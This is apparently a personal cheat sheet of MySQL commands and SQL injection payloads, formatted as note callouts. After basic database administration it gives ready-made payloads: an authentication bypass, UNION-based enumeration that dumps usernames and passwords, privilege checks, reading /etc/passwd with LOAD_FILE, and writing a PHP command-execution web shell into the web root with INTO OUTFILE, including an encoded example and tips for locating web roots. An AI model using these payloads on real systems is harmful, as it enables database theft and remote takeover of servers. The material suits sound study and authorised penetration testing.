> [!TLDR] 🗄️ MySQL & SQLi Command Cheat Sheet
> 
> A structured reference guide for MySQL database management, enumeration, and SQL injection payloads, optimized for your operational notes.

> [!EXAMPLE] 🧩 Basic Connection Syntax
> 
> Login to a MySQL database from the terminal:
> 
> Bash
> 
> ```
> mysql -u root -h 127.0.0.1 -P 3306 -p
> ```

> [!INFO] 🗃️ Database & Table Management
> 
> General informational commands for mapping out the database structure.
> 
> |**Command**|**Description**|
> |---|---|
> |`SHOW DATABASES`|List available databases|
> |`USE users`|Switch to database|
> |`CREATE TABLE logins (id INT, ...)`|Add a new table|
> |`SHOW TABLES`|List available tables in current database|
> |`DESCRIBE logins`|Show table properties and columns|

> [!DANGER] ⚠️ Destructive Action
> 
> **Do not run in production unless authorized.**
> 
> SQL
> 
> ```
> DROP TABLE logins
> ```
> 
> _Deletes the table and all its data entirely._

> [!CHECK] 🏗️ Modifying Tables & Data
> 
> Verification and action commands for altering schema and injecting records.
> 
> |**Command**|**Description**|
> |---|---|
> |`ALTER TABLE logins ADD newColumn INT`|Add new column|
> |`ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`|Rename column|
> |`ALTER TABLE logins MODIFY oldColumn DATE`|Change column datatype|
> |`ALTER TABLE logins DROP oldColumn`|Delete column|
> |`INSERT INTO table_name VALUES (val_1,..)`|Add values to table|
> |`INSERT INTO table_name(col2) VALUES (val2)`|Add values to specific columns|
> |`UPDATE table_name SET col1=new WHERE <cond>`|Update table values|

> [!NOTE] 🔍 Querying & Output Filtering
> 
> Standard methodology for extracting exactly what you need.
> 
> |**Command**|**Description**|
> |---|---|
> |`SELECT * FROM table_name`|Show all columns in a table|
> |`SELECT column1, column2 FROM table_name`|Show specific columns in a table|
> |`SELECT * FROM logins ORDER BY column_1`|Sort by column (Ascending)|
> |`SELECT * FROM logins ORDER BY column_1 DESC`|Sort by column in descending order|
> |`SELECT * FROM logins ORDER BY col_1 DESC, id ASC`|Sort by two-columns|
> |`SELECT * FROM logins LIMIT 2`|Only show first two results|
> |`SELECT * FROM logins LIMIT 1, 2`|Show first two results starting from index 2|
> |`SELECT * FROM table_name WHERE <condition>`|List results that meet a condition|
> |`SELECT * FROM logins WHERE username LIKE 'admin%'`|List results matching a string pattern|

> [!ATTENTION] ⚖️ MySQL Operator Precedence
> 
> Keep this in mind when chaining complex SQLi logic. _From highest to lowest:_
> 
> 1. Division (`/`), Multiplication (`*`), and Modulus (`%`)
>     
> 2. Addition (`+`) and Subtraction (`-`)
>     
> 3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
>     
> 4. `NOT` (`!`)
>     
> 5. `AND` (`&&`)
>     
> 6. `OR` (`||`)
>     

### 🔥 SQL Injection (SQLi) Payloads

> [!SUCCESS] 🔓 Auth Bypass
> 
> When a payload hits and grants access.
> 
> |**Payload**|**Description**|
> |---|---|
> |`admin' or '1'='1`|Basic Auth Bypass|
> |`admin')-- -`|Basic Auth Bypass With comments|

> [!CHECK] 🔗 Union Injection Methodology
> 
> Verification steps for finding column counts and types.
> 
> |**Payload**|**Description**|
> |---|---|
> |`' order by 1-- -`|Detect number of columns using order by|
> |`cn' UNION select 1,2,3-- -`|Detect number of columns using Union injection|
> |`cn' UNION select 1,@@version,3,4-- -`|Basic Union injection|
> |`UNION select username, 2, 3, 4 from passwords-- -`|Union injection for 4 columns|

> [!INFO] 🕵️ Database Enumeration
> 
> Extracting the internal layout of the database.
> 
> |**Payload**|**Description**|
> |---|---|
> |`SELECT @@version`|Fingerprint MySQL with query output|
> |`SELECT SLEEP(5)`|Fingerprint MySQL with no output (Time-based)|
> |`cn' UNION select 1,database(),2,3-- -`|Current database name|
> |`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`|List all databases|
> |`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`|List all tables in a specific database (`dev`)|
> |`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`|List all columns in a specific table|
> |`cn' UNION select 1, username, password, 4 from dev.credentials-- -`|Dump data from a table in another database|

> [!WARNING] 🛡️ Privileges & Access
> 
> Check these before attempting file operations.
> 
> |**Payload**|**Description**|
> |---|---|
> |`cn' UNION SELECT 1, user(), 3, 4-- -`|Find current user|
> |`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="<db-user>"-- -`|Find if user has admin privileges|
> |`cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`|Find all user privileges|
> |`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`|Find which directories can be accessed|

> [!CAUTION] 📂 File Injection
> 
> Tricky syntax areas that require specific directory permissions (`secure_file_priv`).
> 
> |**Payload**|**Description**|
> |---|---|
> |`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`|Read a local file|
> |`select 'file written successfully!' into outfile '/var/www/html/proof.txt'`|Write a string to a local file|
> |`cn' union select "",'<?php echo "PoC"; ?>', "", "" into outfile '/var/www/html/shell.php'-- -`|Write a PHP PoC to a local file|

> [!ABSTRACT] 🧠 Mental Model: The SQLi Flow
> 
> 🎯 **Think Like This:**
> 
> `Detect Entry Point` → `Determine Column Count/Type` → `Enumerate DBs & Tables` → `Extract Data` →
> 
> `Escalate Privileges (File I/O)`


> [!NOTE] **Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.



>[!ALERT] php shell to use
```
 <?php system($_REQUEST[0]); ?>
 
 ##### example of wah it looks like
 +union+select+"",'<?php+system($_REQUEST[0]);+?>',+"",+""+into+outfile+'/var/www/chattr-prod/shelll.php'--+
```


> [!WARNING] for writing file even if response is 500 check file log as its exist launch web shell